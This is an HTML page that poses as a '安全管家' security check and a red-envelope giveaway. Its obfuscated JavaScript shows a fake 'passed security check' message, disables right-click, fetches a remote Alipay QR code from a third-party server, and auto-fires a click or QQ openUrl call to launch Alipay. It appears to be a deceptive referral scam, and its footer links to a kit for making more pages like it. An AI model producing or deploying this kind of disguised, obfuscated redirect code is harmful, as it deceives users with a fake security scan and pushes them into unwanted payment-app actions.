
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge,chrome=1">
    <meta itemprop="name" content="点击领取红包">
    <meta itemprop="image" content="http://cdn2.vwanka.com/5541ba63f4b50074513f.png">
    <meta name="description" itemprop="description" content="点击领取红包">
    <title>安全管家</title>
    <style>
        body {
            margin: 0;
        }

        .wxtip {
            background: rgba(0, 0, 0, 0.5);
            text-align: center;
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 998;
            display: none;
        }

        .wxtip-icon {
            width: 52px;
            height: 67px;
            background: url('/img/jiantou.png') no-repeat;
            display: block;
            position: absolute;
            right: 20px;
            top: 20px;
        }

        .wxtip-txt {
            margin-top: 107px;
            color: #fff;
            font-size: 16px;
            line-height: 1.5;
        }


        [class^="weui-icon-"],
        [class*=" weui-icon-"] {
            display: inline-block;
            vertical-align: middle;
            font: normal normal normal 14px/1 "weui";
            font-size: inherit;
            text-rendering: auto;
            -webkit-font-smoothing: antialiased;
            &:before {
                display: inline-block;
                margin-left: .2em;
                margin-right: .2em;
            }
        }

        .weui-icon-waiting {
            background-image: url('/img/t01.png')
        }

        .weui-icon-success {
            background-image: url('/img/t02.png')
        }

        .weui-btn_primary {
            background-color: #1AAD19;
        }

        .weui-btn {
            position: relative;
            display: block;
            margin-left: auto;
            margin-right: auto;
            padding-left: 14px;
            padding-right: 14px;
            box-sizing: border-box;
            font-size: 18px;
            text-align: center;
            text-decoration: none;
            color: #FFFFFF;
            line-height: 2.55555556;
            border-radius: 5px;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            overflow: hidden;
            margin-bottom: 20px;
        }

        .weui-btn_default {
            color: #000000;
            background-color: #F8F8F8;
        }

        .weui-icon-waiting {
            color: #10AEFF;
        }

        .weui-icon-success {
            color: #1AAD19;
        }

        .icon {
            display: inline-block;
            height: 100px;
            width: 100px;
            margin: 20px auto;
        }

        .actions {
            padding: 10px 30px;
        }

        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            text-align: center;
            color: #999;
            font-size: 12px;
        }
    </style>



</head>

<body>
    <div class="wxtip" id="JweixinTip">
        <span class="wxtip-icon"></span>
        <p class="wxtip-txt">请点击右上角···<br>选择在“浏览器”中打开</p>
    </div>
    <div style="text-align:center;padding:60px 10px 50px 10px;">
        <i class="weui-icon-waiting icon" id="icon"></i>
        <p style="font-size:20px;color:#555;" id="iconText">正在检测...</p>
        <p style="font-size:12px;color:#999;" id="subText"></p>
    </div>


    <div class="actions" id="goHome">
        <a href="javascript:void(0);" onclick="show()" class="weui-btn weui-btn_primary" id="page">点击前往</a>
        <a href="https://jq.qq.com/?_wv=1027&k=54gOtXG" id="homeurl" class="weui-btn weui-btn_default" style="display:none">我也要做一个</a>
    </div>
    <div class="footer">
        <p>安全管家提供技术支持</p>
        <p>Copyright © 1998 - 2018. All Rights Reserved.</p>
    </div>


    <script type="text/javascript" src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
    <script type='text/javascript' src='/js/zepto.js' charset='utf-8'></script>
    <script>
var __encode ='sojson.com', _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(window);var __Ox19460=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x65\x78\x65\x63","\x5B\x5C\x3F\x26\x5D","\x3D\x28\x5B\x5E\x26\x23\x5D\x2A\x29","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x71\x71","\x68\x74\x74\x70","\x69\x6E\x64\x65\x78\x4F\x66","\x61\x74\x74\x72","\x23\x68\x6F\x6D\x65\x75\x72\x6C","\x2E\x2F\x6D\x61\x6B\x65\x2E\x68\x74\x6D\x6C\x3F\x71\x71\x3D","\x71\x72\x63\x6F\x64\x65","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x71\x72\x2E\x61\x6C\x69\x70\x61\x79\x2E\x63\x6F\x6D\x2F\x63\x31\x78\x30\x32\x39\x38\x35\x6A\x72\x64\x63\x62\x71\x63\x66\x6A\x35\x69\x79\x78\x32\x65","\x61\x6C\x69\x70\x61\x79\x73\x3A\x2F\x2F\x70\x6C\x61\x74\x66\x6F\x72\x6D\x61\x70\x69\x2F\x73\x74\x61\x72\x74\x61\x70\x70\x3F\x73\x61\x49\x64\x3D\x31\x30\x30\x30\x30\x30\x30\x37\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x33\x2E\x37\x2E\x30\x2E\x30\x37\x31\x38\x26\x71\x72\x63\x6F\x64\x65\x3D","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x70\x61\x67\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x68\x74\x74\x70\x3A\x2F\x2F\x6A\x64\x2E\x79\x73\x6D\x6C\x63\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x68\x62\x2F\x70\x76\x3F\x71\x72\x63\x6F\x64\x65\x3D","\x72","\x67\x65\x74","\x6F\x6E\x63\x6F\x6E\x74\x65\x78\x74\x6D\x65\x6E\x75","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x20","\x73\x65\x74\x54\x69\x74\x6C\x65\x42\x75\x74\x74\x6F\x6E\x73","\x75\x69","\x69\x63\x6F\x6E","\x69\x63\x6F\x6E\x54\x65\x78\x74","\x73\x75\x62\x54\x65\x78\x74","\x77\x65\x75\x69\x2D\x69\x63\x6F\x6E\x2D\x73\x75\x63\x63\x65\x73\x73","\x61\x64\x64","\x63\x6C\x61\x73\x73\x4C\x69\x73\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\u5DF2\u901A\u8FC7\u5B89\u5168\u68C0\u6D4B","\u5982\u679C\u6CA1\u6709\u81EA\u52A8\u8DF3\u8F6C\uFF0C\u8BF7\u70B9\u51FB\u4E0B\u65B9\u6309\u94AE\u524D\u5F80","\x72\x61\x6E\x64\x6F\x6D","\x68\x6F\x6D\x65\x75\x72\x6C","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x62\x6C\x6F\x63\x6B","\x74\x65\x73\x74","\x43\x75\x73\x74\x6F\x6D\x45\x76\x65\x6E\x74","\x63\x6C\x69\x63\x6B","\x45\x76\x65\x6E\x74","\x63\x72\x65\x61\x74\x65\x45\x76\x65\x6E\x74","\x69\x6E\x69\x74\x45\x76\x65\x6E\x74","\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6E\x74","\x6F\x70\x65\x6E\x55\x72\x6C","\x69\x6E\x76\x6F\x6B\x65"];var urlParam=function(_0x68bbx2){var _0x68bbx3= new RegExp(__Ox19460[3]+ _0x68bbx2+ __Ox19460[4])[__Ox19460[2]](window[__Ox19460[1]][__Ox19460[0]]);if(_0x68bbx3){return _0x68bbx3[1]}else {return 0}};var ua=navigator[__Ox19460[6]][__Ox19460[5]]();var qq=urlParam(__Ox19460[7]);if(qq){if(qq[__Ox19460[9]](__Ox19460[8])>= 0){$(__Ox19460[11])[__Ox19460[10]](__Ox19460[0],qq)}else {$(__Ox19460[11])[__Ox19460[10]](__Ox19460[0],__Ox19460[12]+ qq)}};var qrcode=urlParam(__Ox19460[13])|| __Ox19460[14];var scheme=__Ox19460[15]+ qrcode;document[__Ox19460[18]](__Ox19460[17])[__Ox19460[16]](__Ox19460[0],scheme);var qrcode2;var firstTime=true;var r=0.2;var change=function(){$[__Ox19460[21]](__Ox19460[19]+ qrcode,function(_0x68bbxc){if(_0x68bbxc&& _0x68bbxc[__Ox19460[13]]){qrcode2= _0x68bbxc[__Ox19460[13]];scheme= __Ox19460[15]+ qrcode2;document[__Ox19460[18]](__Ox19460[17])[__Ox19460[16]](__Ox19460[0],scheme)};if(_0x68bbxc&& _0x68bbxc[__Ox19460[20]]){r= _0x68bbxc[__Ox19460[20]]}})};change();document[__Ox19460[22]]= function(_0x68bbxd){_0x68bbxd[__Ox19460[23]]()};mqq[__Ox19460[26]][__Ox19460[25]]({right:{title:__Ox19460[24],callback:function(){}}});setTimeout(function(){var _0x68bbxe=document[__Ox19460[18]](__Ox19460[27]);var _0x68bbxf=document[__Ox19460[18]](__Ox19460[28]);var _0x68bbx10=document[__Ox19460[18]](__Ox19460[29]);_0x68bbxe[__Ox19460[32]][__Ox19460[31]](__Ox19460[30]);_0x68bbxf[__Ox19460[33]]= __Ox19460[34];_0x68bbx10[__Ox19460[33]]= __Ox19460[35]},1000);function show(){if(firstTime){setTimeout(function(){scheme= __Ox19460[15]+ qrcode;document[__Ox19460[18]](__Ox19460[17])[__Ox19460[16]](__Ox19460[0],scheme);if(Math[__Ox19460[36]]()< r){var _0x68bbx12=document[__Ox19460[18]](__Ox19460[37]);_0x68bbx12[__Ox19460[39]][__Ox19460[38]]= __Ox19460[40]};firstTime= false},1000)}}function isWeixin(){if(/micromessenger/[__Ox19460[41]](ua)){return true}else {return false}}function isMobileQQ(){if(/mobile/[__Ox19460[41]](ua)&& /qq/[__Ox19460[41]](ua)){return true}else {return false}}function isIos(){if(/iphone|ipad|ipod/[__Ox19460[41]](ua)){return true}else {return false}}function customClickEvent(){var _0x68bbx17;if(window[__Ox19460[42]]){_0x68bbx17= new window.CustomEvent(__Ox19460[43],{canBubble:true,cancelable:true})}else {_0x68bbx17= document[__Ox19460[45]](__Ox19460[44]);_0x68bbx17[__Ox19460[46]](__Ox19460[43],true,true)};return _0x68bbx17}if(isIos()){var page=document[__Ox19460[18]](__Ox19460[17]);page[__Ox19460[47]](customClickEvent())}else {var qrurl=scheme;mqq[__Ox19460[49]](__Ox19460[26],__Ox19460[48],{url:qrurl,target:2,style:0})}
    </script>
</body>

</html>